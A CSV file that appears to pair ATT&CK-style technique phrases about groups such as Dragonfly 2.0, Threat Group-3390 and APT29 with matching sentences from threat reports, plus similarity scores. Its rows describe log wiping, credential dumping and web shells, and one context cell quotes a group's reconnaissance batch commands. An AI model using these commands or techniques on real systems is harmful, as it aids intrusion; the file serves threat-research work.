phrase,before,matching_sentence,after,report_id,rank,cosine_score
"threat group-3390 has used dll side-loading, including by using legitimate kaspersky antivirus variants in which the dll acts as a stub loader that loads and executes the shell code.","enabling these features gives the threat actor a remote control channel to persistently access the victim's environment without using malicious software that could be detected.figure 3. powershell commands. (source: secureworks)some payloads leveraged dll side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious dll.","the dll acts as a stub loader, which loads and executes shell code.","bronze union previously used this technique to enable execution of plugx and httpbrowser tools in a way that is challenging for network defenders to detect.in 2016, ctu researchers observed the group using native system functionality to disable logging processes and delete logs within a compromised environment. the threat actors used theappcmdcommand-line tool to unlock and disable the default logging component on the server (systsm.webserver/httplogging) and then delete existing logs from the system (see figure 4).figure 4. threat actor using appcmd to delete logs and disable logging.",66f573083063d294857006fc,1289,0.7088410931130777
"ramsay has been embedded in documents exploiting cve-2017-0199, cve-2017-11882, and cve-2017-8570.","notably, documents created with this builder use the cmstp bypass as described in [2]. both palo alto networks [3] and quoscient [4] have previously described documents created with this kit.venomkitwe use this name to describe documents generated by a builder purchased from the same seller as taurus builder.","depending on the variant it may exploit cve-2017-0199, cve-2017-8570, cve-2017-8759, cve-2017-11882, cve-2018-0802, and/or cve-2018-8174.","notably, venomkit often also uses the same cmstp bypass as taurus. documents from this kit have previously been discussed by quoscient [4].more_eggsmore_eggs is malware written in jscript used in these campaigns and others.",66f573ca3063d29485700766,4425,0.7831855005433126
"the group has previously exploited cve-2017-8570, cve-2012-1856, cve-2014-4114, cve-2017-0199, cve-2017-11882, and cve-2015-1641.","notably, documents created with this builder use the cmstp bypass as described in [2]. both palo alto networks [3] and quoscient [4] have previously described documents created with this kit.venomkitwe use this name to describe documents generated by a builder purchased from the same seller as taurus builder.","depending on the variant it may exploit cve-2017-0199, cve-2017-8570, cve-2017-8759, cve-2017-11882, cve-2018-0802, and/or cve-2018-8174.","notably, venomkit often also uses the same cmstp bypass as taurus. documents from this kit have previously been discussed by quoscient [4].more_eggsmore_eggs is malware written in jscript used in these campaigns and others.",66f573ca3063d29485700766,4425,0.7810779617574208
"leviathan has exploited multiple microsoft office and .net vulnerabilities for execution, including cve-2017-0199, cve-2017-8759, and cve-2017-11882.","notably, documents created with this builder use the cmstp bypass as described in [2]. both palo alto networks [3] and quoscient [4] have previously described documents created with this kit.venomkitwe use this name to describe documents generated by a builder purchased from the same seller as taurus builder.","depending on the variant it may exploit cve-2017-0199, cve-2017-8570, cve-2017-8759, cve-2017-11882, cve-2018-0802, and/or cve-2018-8174.","notably, venomkit often also uses the same cmstp bypass as taurus. documents from this kit have previously been discussed by quoscient [4].more_eggsmore_eggs is malware written in jscript used in these campaigns and others.",66f573ca3063d29485700766,4425,0.7468297820968485
this is most likely meant to be a mechanism to update the compromised host with a new version of the lowball malware.,"it uses the dropbox api with a hardcoded bearer access token and has the ability to download, upload, and execute files. the communication occurs via https over port 443.after execution, the malware will use the dropbox api to make an http get request using https over tcp port 443 for the files:md5filenamed76261ba3b624933a6ebb5dd73758db4wmiapcom79b68cdd0044edd4fbf8067b22878644wmiapcom.batthe “wmiapcom.bat” file is simply used to start “wmiapcom”, which happens to be the exact same file as the one dropped by the malicious word documents.","however, this is most likely meant to be a mechanism to update the compromised host with a new version of the lowball malware.the threat group monitors its dropbox account for responses from compromised computers.","once the lowball malware calls back to the dropbox account, the attackers will create a file called “[computer_name]_upload.bat” which contains commands to be executed on the compromised computer. this batch file is then executed on the target computer, with the results uploaded to the attackers’ dropbox account in a file named “[computer_name]_download”.we observed the threat group issue the following commands:@echo offdir c:\\\\ >> %temp%\\\\downloadipconfig /all >> %temp%\\\\downloadnet user >> %temp%\\\\downloadnet user /domain >> %temp%\\\\downloadver >> %temp%\\\\downloaddel %0@echo offdir ""c:\\\\documents and settings"" >> %temp%\\\\downloaddir ""c:\\\\program files\\\\"" >> %temp%\\\\downloadnet start >> %temp%\\\\downloadnet localgroup administrator >> %temp%\\\\downloadnetstat -ano >> %temp%\\\\downloadthese commands allow the threat group to gain information about the compromised computer and the network to which it belongs.",66f573453063d2948570071f,2264,0.7540025223413854
kazuar is obfuscated using the open source confuserex protector.,"attackers making use of the free malware could also be getting shortchanged on the “free” offer: as our analysis reveals, the malware authors maintain access to all data stolen by their clients, and they could well be profiting from it in addition to, or even in advance of, their clientele. not so “free,” after all.operating systemrisk & impacttechnical analysiszingostealer is delivered as a highly obfuscated .net executable.","the initial file is obfuscated using confuserex, an open-source protector tool for .net files.","the file is decrypted on the fly using the type initializer "".cctor,"" which causes error messages when attempting to use automatic deobfuscation tools. this makes readable code more difficult to obtain, providing the attacker with a means of impeding analysis.figure 1  – obfuscated .net zingostealer executablewhen executed, the first thing the malware does is reach out to its c2 server to retrieve a list of dependencies (also shown in figure 2).",66f573863063d2948570073d,3030,0.7684254060847739
"threat group-3390 actors use at to schedule tasks to run self-extracting rar archives, which install httpbrowser or plugx on other victims on a network.","tg-3390 actors favor at.exe to create scheduled tasks for executing commands on remote systems.figure 12. nbtscan batch script (renamed ipcan.exe) used to profile network. (source: dell secureworks)over a few days' span, the threat actors install remote access tools on additional systems based upon the results of the network reconnaissance.","they use at.exe to schedule tasks to run self-extracting rar archives, which install either httpbrowser or plugx.","ctu researchers observed the threat actors collecting cisco vpn profiles to use when accessing the victim's network via vpn (see figure 13).figure 13. copying of .pcf files. (source: dell secureworks)to facilitate lateral movement, the adversaries deploy aspxtool web shells to internally accessible systems running iis.ctu researchers have observed the threat actors encrypting data using the password ""admin-windows2014"" and splitting the rar archives into parts in the recycler directory, with the same name as the uncompressed data (see figure 14).figure 14. batch script used to archive data.",66f574483063d294857007aa,1983,0.8015572291731203
"dragonfly 2.0 cleared windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs.",[15]enterpriset1562.004impair defenses:disable or modify system firewalldragonflyhas disabled host-based firewalls. the group has also globally opened port 3389.,"[15]enterpriset1070.001indicator removal:clear windows event logsdragonflyhas cleared windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs.","the actors also deleted specific registry keys. [15].004indicator removal:file deletiondragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.",66f574df3063d294857007fc,4297,0.791524525346079
the actors also deleted specific registry keys.,"the group has also globally opened port 3389. [15]enterpriset1070.001indicator removal:clear windows event logsdragonflyhas cleared windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs.",the actors also deleted specific registry keys.,"[15].004indicator removal:file deletiondragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots. [15]enterpriset1105ingress tool transferdragonflyhas copied and installed tools for operations once in the victim environment.",66f574df3063d294857007fc,4298,1.0
"threat group-3390 has used dll side-loading, including by using legitimate kaspersky antivirus variants in which the dll acts as a stub loader that loads and executes the shell code.","hunter queried the following uris in a specific order to determine if the associated software configurations are insecure, and all queries contained the httpclient user-agent:get /manager/html/ — tomcat web application managerget /jmx-console/ — jboss configurationget /cfide/administrator/login.cfm — coldfusion configurationinstallationtg-3390 uses dll side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious dll. ctu researchers have observed the threat actors employing legitimate kaspersky antivirus variants in analyzed samples.","the dll acts as a stub loader, which loads and executes the shell code.",the adversaries have used this technique to allow plugx and httpbrowser to persist on a system.note: dll side loading is a prevalent persistence technique that is used to launch a multitude of backdoors. the challenge is detecting known good software loading and running malware.,66f574483063d294857007aa,1965,0.7140501405800413
the group has also globally opened port 3389.,[7]enterpriset1564.002hide artifacts:hidden usersdragonflyhas modified the registry to hide created user accounts. [15]enterpriset1562.004impair defenses:disable or modify system firewalldragonflyhas disabled host-based firewalls.,the group has also globally opened port 3389.,"[15]enterpriset1070.001indicator removal:clear windows event logsdragonflyhas cleared windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. the actors also deleted specific registry keys.",66f574df3063d294857007fc,4296,1.0000000000000002
"hafnium has exploited cve-2021-26855, cve-2021-26857, cve-2021-26858, and cve-2021-27065  to compromise on-premises versions of microsoft exchange server, enabling access to email accounts and installation of additional malware.","there is a check in the batch-requests plugin which overrides the client ip with its real remote ip. but due to a bug in the code, this check can be bypassed.recommended mitigationsin affected versions of apache apisix, you can avoid this risk by explicitly commenting out batch-requests in the conf/config.yaml and conf/config-default.yaml files and restarting apache apisix.update to 2.10.4 or 2.12.1.detection methodsn/avulnerable technologies and versionsapache apisix between 1.3 and 2.12.1 (excluding 2.12.1)lts versions of apache apisix between 2.10.0 and 2.10.4table xvii: zoho cve-2021-40539zoho cve-2021-40539 cvss 3.0: 9.8 (critical)vulnerability descriptionzoho manageengine adselfservice plus version 6113 and prior is vulnerable to rest api authentication bypass with resultant remote code execution.recommended mitigationsupgrade to latest version.detection methodsrun manageengine’s detection tool.check for specific files andlogs.vulnerable technologies and versionszoho corp manageengine adselfservice plustable xviii: microsoft cve-2021-26857microsoft cve-2021-26857 cvss 3.0: 7.8 (high)vulnerability descriptionmicrosoft exchange server remote code execution vulnerability.","this cve id differs from cve-2021-26412, cve-2021-26854, cve-2021-26855, cve-2021-26858, cve-2021-27065, and cve-2021-27078.recommended mitigationsupdate to support latest version.install microsoft security patch.use microsoft exchange on-premises mitigation tool.detection methodsrun exchange script: https://github.com/microsoft/css-exchange/tree/main/security.hashes can be found here: https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/#scan-log.vulnerable technologies and versionsmicrosoft exchange serverstable xix: microsoft cve-2021-26858table xx: microsoft cve-2021-27065table xxi: apache cve-2021-41773apache cve-2021-41773 cvss 3.0: 7.5 (high)vulnerability descriptionthis vulnerability has been modified since it was last analyzed by nvd.","it is awaiting reanalysis, which may result in further changes to the information provided. a flaw was found in a change made to path normalization in apache http server 2.4.49. a malicious actor could use a path traversal attack to map urls to files outside the directories configured by alias-like directives.",66f574d13063d294857007f1,4098,0.7105978176339874
"dragonfly 2.0 deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.","[15]enterpriset1070.001indicator removal:clear windows event logsdragonflyhas cleared windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. the actors also deleted specific registry keys.","[15].004indicator removal:file deletiondragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.",[15]enterpriset1105ingress tool transferdragonflyhas copied and installed tools for operations once in the victim environment. [15]enterpriset1036masqueradingdragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account.,66f574df3063d294857007fc,4299,0.7418720166376422
dragonfly 2.0 has gathered hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[8]enterpriset1133external remote servicesdragonflyhas used vpns and outlook web access (owa) to maintain access to victim networks. [15][8]enterpriset1083file and directory discoverydragonflyhas used a batch script to gather folder and file names from victim hosts.,[15][7][8]enterpriset1187forced authenticationdragonflyhas gathered hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[15][7]enterpriset1591.002gather victim org information:business relationshipsdragonflyhas collected open source information to identify relationships between organizations for targeting purposes. [7]enterpriset1564.002hide artifacts:hidden usersdragonflyhas modified the registry to hide created user accounts.,66f574df3063d294857007fc,4292,0.8479097466636698
dragonfly has performed forced authentication to gather hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[8]enterpriset1133external remote servicesdragonflyhas used vpns and outlook web access (owa) to maintain access to victim networks. [15][8]enterpriset1083file and directory discoverydragonflyhas used a batch script to gather folder and file names from victim hosts.,[15][7][8]enterpriset1187forced authenticationdragonflyhas gathered hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[15][7]enterpriset1591.002gather victim org information:business relationshipsdragonflyhas collected open source information to identify relationships between organizations for targeting purposes. [7]enterpriset1564.002hide artifacts:hidden usersdragonflyhas modified the registry to hide created user accounts.,66f574df3063d294857007fc,4292,0.7491349485679597
"dragonfly 2.0 created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.",the group was observed installing python 2.7 on a victim. [15]enterpriset1584.004compromise infrastructure:serverdragonflyhas compromised legitimate websites to host c2 and malware modules.,"[7]enterpriset1136.001create account:local accountdragonflyhas created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.","[15]enterpriset1005data from local systemdragonflyhas collected data from local victim systems. [15]enterpriset1074.001data staged:local data stagingdragonflyhas created a directory named ""out"" in the user's %appdata% folder and copied files to it.",66f574df3063d294857007fc,4282,0.760446675883364
dragonfly 2.0 created accounts disguised as legitimate backup and service accounts as well as an email administration account.,"[15].004indicator removal:file deletiondragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots. [15]enterpriset1105ingress tool transferdragonflyhas copied and installed tools for operations once in the victim environment.",[15]enterpriset1036masqueradingdragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account.,"[15]enterpriset1112modify registrydragonflyhas modified the registry to perform multiple techniques through the use ofreg. [15]enterpriset1135network share discoverydragonflyhas identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ics or supervisory control and data acquisition (scada) systems.",66f574df3063d294857007fc,4301,0.8400771392822858
"owaauth uses the filename owaauth.dll, which is a legitimate file that normally resides in %programfiles%\\microsoft\\exchange server\\clientaccess\\owa\\auth\\; the malicious file by the same name is saved in %programfiles%\\microsoft\\exchange server\\clientaccess\\owa\\bin\\.","(source: dell secureworks)appendix c — owaauth web shell analysisowaauth is a web shell that is installed as an isapi filter on exchange servers and shares characteristics with the chinachopper web shell. like chinachopper, it parses http requests for the z1 and z2 parameters (see table 4).",the legitimate owaauth.dll file resides in %programfiles%\\\\microsoft\\\\exchange server\\\\clientaccess\\\\owa\\\\auth\\\\ while ctu researchers have observed the backdoor using the same filename in the %programfiles%\\\\microsoft\\\\exchange server\\\\clientaccess\\\\owa\\\\bin\\\\ directory.,"in addition to acting as a web shell, the malware captures and des-encrypts credentials before writing the username and password to disk. the owaauth web shell enables a threat actor to upload and download files, launch processes, and execute sql queries.each web shell instance is configured to contain sp, key, and log variables.",66f574483063d294857007aa,2028,0.8687430321319289
they also obtained ntds.dit from domain controllers.,[4]enterpriset1003.002os credential dumping:security account managerdragonflyhas dropped and executed secretsdump to dump password hashes. [15].003os credential dumping:ntdsdragonflyhas dropped and executed secretsdump to dump password hashes.,they also obtained ntds.dit from domain controllers.,[15][17].004os credential dumping:lsa secretsdragonflyhas dropped and executed secretsdump to dump password hashes. [15][17]enterpriset1069.002permission groups discovery:domain groupsdragonflyhas used batch scripts to enumerate administrators and users in the domain.,66f574df3063d294857007fc,4307,1.0000000000000002
"dragonfly 2.0 identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ics or supervisory control and data acquisition  systems.",[15]enterpriset1036masqueradingdragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account. [15]enterpriset1112modify registrydragonflyhas modified the registry to perform multiple techniques through the use ofreg.,"[15]enterpriset1135network share discoverydragonflyhas identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ics or supervisory control and data acquisition (scada) systems.","[15]enterpriset1588.002obtain capabilities:tooldragonflyhas obtained and used tools such asmimikatz,crackmapexec, andpsexec. [4]enterpriset1003.002os credential dumping:security account managerdragonflyhas dropped and executed secretsdump to dump password hashes.",66f574df3063d294857007fc,4303,0.790093487882195
"dragonfly identified and browsed file servers on the victim network, viewing files pertaining to ics or supervisory control and data acquisition  systems.",[15]enterpriset1036masqueradingdragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account. [15]enterpriset1112modify registrydragonflyhas modified the registry to perform multiple techniques through the use ofreg.,"[15]enterpriset1135network share discoverydragonflyhas identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ics or supervisory control and data acquisition (scada) systems.","[15]enterpriset1588.002obtain capabilities:tooldragonflyhas obtained and used tools such asmimikatz,crackmapexec, andpsexec. [4]enterpriset1003.002os credential dumping:security account managerdragonflyhas dropped and executed secretsdump to dump password hashes.",66f574df3063d294857007fc,4303,0.7508340516537171
httpbrowser's code may be obfuscated through structured exception handling and return-oriented programming.,the malware can be configured to use multiple network protocols to avoid network-based detection. dll side loading is often used to maintain persistence on the compromised system.httpbrowser (also known as tokencontrol) — a backdoor notable for https communications with the httpbrowser/1.0 user-agent (see figure 3).,httpbrowser's executable code may be obfuscated through structured exception handling and return-oriented programming.,"its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes. antivirus detection for httpbrowser is extremely low and is typically based upon heuristic signatures.",66f574483063d294857007aa,1935,0.9757278898501893
ursnif has used a peer-to-peer  network for c2.,"(source: dell secureworks)lastly, we examined how well connected the waledac/kelihos peer-to-peer network was by analyzing each node's peers list. because each node maintains a list of up to 250 other peers, the network organizes itself almost into a single cluster.",figure 5 shows how the peer-to-peer network appeared at the start of our sinkhole.figure 5. the peer-to-peer network graph.,the edges between nodes indicate a link between two nodes based on their peer lists. (source: dell secureworks)botnet protection recommendationsthe ctu research team recommends that businesses continue to educate employees on botnet protection and enforce policies to keep the software on systems up to date.,66f574c03063d294857007ea,3836,0.7165080280207271
"dragonfly 2.0 used various types of scripting to perform operations, including python scripts.","[15].001powershelldragonflyhas used powershell scripts for execution. [15][5].003windows command shelldragonflyhas used various types of scripting to perform operations, including batch scripts.","[15].006pythondragonflyhas used various types of scripting to perform operations, including python scripts.",the group was observed installing python 2.7 on a victim. [15]enterpriset1584.004compromise infrastructure:serverdragonflyhas compromised legitimate websites to host c2 and malware modules.,66f574df3063d294857007fc,4279,0.7506622660198202
the group was observed installing python 2.7 on a victim.,"[15][5].003windows command shelldragonflyhas used various types of scripting to perform operations, including batch scripts. [15].006pythondragonflyhas used various types of scripting to perform operations, including python scripts.",the group was observed installing python 2.7 on a victim.,"[15]enterpriset1584.004compromise infrastructure:serverdragonflyhas compromised legitimate websites to host c2 and malware modules. [7]enterpriset1136.001create account:local accountdragonflyhas created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.",66f574df3063d294857007fc,4280,1.0000000000000002
dragonfly 2.0 used spearphishing with pdf attachments containing malicious links that redirected to credential harvesting websites.,[15]enterpriset1566.001phishing:spearphishing attachmentdragonflyhas sent emails with malicious attachments to gain initial access. [7]enterpriset1598.002phishing for information:spearphishing attachmentdragonflyhas used spearphishing with microsoft office attachments to enable harvesting of user credentials.,[15].003phishing for information:spearphishing linkdragonflyhas used spearphishing with pdf attachments containing malicious links that redirected to credential harvesting websites.,[15]enterpriset1012query registrydragonflyhas queried the registry to identify victim information. [15]enterpriset1021.001remote services:remote desktop protocoldragonflyhas moved laterally via rdp.,66f574df3063d294857007fc,4312,0.7399066719676272
spark has checked the results of the getkeyboardlayoutlist and the language name returned by getlocaleinfoa to make sure they contain the word “arabic” before executing.,"figure 5 shows the splash image displayed by the enigma protector prior to executing the malicious payload, which is a wallpaper imageavailable at wallpaperswide.com. the splash screen feature acts as a sandbox evasion technique, as it requires user interaction in the form of clicking the screen before the malicious code runs.figure 5. screenshot of the contents of the malicious pdf documentonce unpacked, we found the spark payload was similar to the payloads delivered in operation parliament from a capability perspective.","the spark payload is a backdoor that allows the threat actors to open applications and run command line commands on the compromised system.the payload starts by checking the results of the getkeyboardlayoutlist and the language name returned by getlocaleinfoa to make sure they contain the word ""arabic"".","if the word is not found in the results of these two api calls, the payload does not execute any of its malicious code. checking for specific keyboards and languages is a known evasion tactic meant to avoid running on analysis systems not configured, as the actor’s targeted victim would be configured.after the payload confirms that the system has the appropriate keyboard and language pack installed for the actor’s desired target, it will begin attempting to communicate with a c2 server specified within a configuration embedded within the payload.",66f574213063d29485700794,1167,0.716559035622091
"dragonfly 2.0 used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",[15]enterpriset1608.004stage capabilities:drive-by targetdragonflyhas compromised websites to redirect traffic and to host exploit kits. [7]enterpriset1195.002supply chain compromise:compromise software supply chaindragonflyhas placed trojanized installers for control system software on legitimate vendor app stores.,"[4][7]enterpriset1016system network configuration discoverydragonflyhas used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",[15]enterpriset1033system owner/user discoverydragonflyused the commandquery useron victim hosts. [15]enterpriset1221template injectiondragonflyhas injected smb urls into malicious word spearphishing attachments to initiateforced authentication.,66f574df3063d294857007fc,4321,0.7590626879228197
"dragonfly 2.0 commonly created web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.","[15]enterpriset1053.005scheduled task/job:scheduled taskdragonflyhas used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files. [15]enterpriset1113screen capturedragonflyhas performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of screenutil).","[15][5][7]enterpriset1505.003server software component:web shelldragonflyhas commonly created web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.",[15]enterpriset1608.004stage capabilities:drive-by targetdragonflyhas compromised websites to redirect traffic and to host exploit kits. [7]enterpriset1195.002supply chain compromise:compromise software supply chaindragonflyhas placed trojanized installers for control system software on legitimate vendor app stores.,66f574df3063d294857007fc,4318,0.7587649302429362
dragonfly 2.0 has gathered hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[8]enterpriset1133external remote servicesdragonflyhas used vpns and outlook web access (owa) to maintain access to victim networks. [15][8]enterpriset1083file and directory discoverydragonflyhas used a batch script to gather folder and file names from victim hosts.,[15][7][8]enterpriset1187forced authenticationdragonflyhas gathered hashed user credentials over smb using spearphishing attachments with external resource links and by modifying .lnk file icon resources to collect credentials from virtualized systems.,[15][7]enterpriset1591.002gather victim org information:business relationshipsdragonflyhas collected open source information to identify relationships between organizations for targeting purposes. [7]enterpriset1564.002hide artifacts:hidden usersdragonflyhas modified the registry to hide created user accounts.,66f574df3063d294857007fc,4292,0.8479097466636698
dragonfly 2.0 created accounts disguised as legitimate backup and service accounts as well as an email administration account.,"[15].004indicator removal:file deletiondragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots. [15]enterpriset1105ingress tool transferdragonflyhas copied and installed tools for operations once in the victim environment.",[15]enterpriset1036masqueradingdragonflyhas created accounts disguised as legitimate backup and service accounts as well as an email administration account.,"[15]enterpriset1112modify registrydragonflyhas modified the registry to perform multiple techniques through the use ofreg. [15]enterpriset1135network share discoverydragonflyhas identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ics or supervisory control and data acquisition (scada) systems.",66f574df3063d294857007fc,4301,0.8400771392822858
"owaauth uses the filename owaauth.dll, which is a legitimate file that normally resides in %programfiles%\\microsoft\\exchange server\\clientaccess\\owa\\auth\\; the malicious file by the same name is saved in %programfiles%\\microsoft\\exchange server\\clientaccess\\owa\\bin\\.","(source: dell secureworks)appendix c — owaauth web shell analysisowaauth is a web shell that is installed as an isapi filter on exchange servers and shares characteristics with the chinachopper web shell. like chinachopper, it parses http requests for the z1 and z2 parameters (see table 4).",the legitimate owaauth.dll file resides in %programfiles%\\\\microsoft\\\\exchange server\\\\clientaccess\\\\owa\\\\auth\\\\ while ctu researchers have observed the backdoor using the same filename in the %programfiles%\\\\microsoft\\\\exchange server\\\\clientaccess\\\\owa\\\\bin\\\\ directory.,"in addition to acting as a web shell, the malware captures and des-encrypts credentials before writing the username and password to disk. the owaauth web shell enables a threat actor to upload and download files, launch processes, and execute sql queries.each web shell instance is configured to contain sp, key, and log variables.",66f574483063d294857007aa,2028,0.8687430321319289
spark has checked the results of the getkeyboardlayoutlist and the language name returned by getlocaleinfoa to make sure they contain the word “arabic” before executing.,"figure 5 shows the splash image displayed by the enigma protector prior to executing the malicious payload, which is a wallpaper imageavailable at wallpaperswide.com. the splash screen feature acts as a sandbox evasion technique, as it requires user interaction in the form of clicking the screen before the malicious code runs.figure 5. screenshot of the contents of the malicious pdf documentonce unpacked, we found the spark payload was similar to the payloads delivered in operation parliament from a capability perspective.","the spark payload is a backdoor that allows the threat actors to open applications and run command line commands on the compromised system.the payload starts by checking the results of the getkeyboardlayoutlist and the language name returned by getlocaleinfoa to make sure they contain the word ""arabic"".","if the word is not found in the results of these two api calls, the payload does not execute any of its malicious code. checking for specific keyboards and languages is a known evasion tactic meant to avoid running on analysis systems not configured, as the actor’s targeted victim would be configured.after the payload confirms that the system has the appropriate keyboard and language pack installed for the actor’s desired target, it will begin attempting to communicate with a c2 server specified within a configuration embedded within the payload.",66f574213063d29485700794,1167,0.716559035622091
"dragonfly 2.0 used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",[15]enterpriset1608.004stage capabilities:drive-by targetdragonflyhas compromised websites to redirect traffic and to host exploit kits. [7]enterpriset1195.002supply chain compromise:compromise software supply chaindragonflyhas placed trojanized installers for control system software on legitimate vendor app stores.,"[4][7]enterpriset1016system network configuration discoverydragonflyhas used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",[15]enterpriset1033system owner/user discoverydragonflyused the commandquery useron victim hosts. [15]enterpriset1221template injectiondragonflyhas injected smb urls into malicious word spearphishing attachments to initiateforced authentication.,66f574df3063d294857007fc,4321,0.7590626879228197
apt29 has created self-signed digital certificates to enable mutual tls authentication for malware.,"[3][30][20][27]for thesolarwinds compromise,apt29used numerous pieces of malware that were likely developed for or by the group, includingsunburst,sunspot,raindrop, andteardrop. [9][11][37]foroperation ghost,apt29used new strains of malware includingfatduke,miniduke,regduke, andpolyglotduke.",[23].003develop capabilities:digital certificatesapt29has created self-signed digital certificates to enable mutual tls authentication for malware.,"[25][26]enterpriset1484.002domain or tenant policy modification:trust modificationduring thesolarwinds compromise,apt29changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate. [15][44]enterpriset1482domain trust discoveryduring thesolarwinds compromise,apt29used theget-accepteddomainpowershell cmdlet to enumerate accepted domains through an exchange management shell.",66f575693063d2948570084d,1914,0.7316488554355869
they also used adfind to enumerate domains and to discover trust between federated domains.,"[25][26]enterpriset1484.002domain or tenant policy modification:trust modificationduring thesolarwinds compromise,apt29changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate. [15][44]enterpriset1482domain trust discoveryduring thesolarwinds compromise,apt29used theget-accepteddomainpowershell cmdlet to enumerate accepted domains through an exchange management shell.",[12]they also usedadfindto enumerate domains and to discover trust between federated domains.,"[18][37]enterpriset1568dynamic resolutionapt29has used dynamic dns providers for their malware c2 infrastructure. [27]during thesolarwinds compromise,apt29used dynamic dns resolution to construct and resolve to randomly-generated subdomains for c2.",66f575693063d2948570084d,1917,0.77847793252917
unc2452 changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate.,"[9][11][37]foroperation ghost,apt29used new strains of malware includingfatduke,miniduke,regduke, andpolyglotduke. [23].003develop capabilities:digital certificatesapt29has created self-signed digital certificates to enable mutual tls authentication for malware.","[25][26]enterpriset1484.002domain or tenant policy modification:trust modificationduring thesolarwinds compromise,apt29changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate.","[15][44]enterpriset1482domain trust discoveryduring thesolarwinds compromise,apt29used theget-accepteddomainpowershell cmdlet to enumerate accepted domains through an exchange management shell. [12]they also usedadfindto enumerate domains and to discover trust between federated domains.",66f575693063d2948570084d,1915,0.7065741932348489
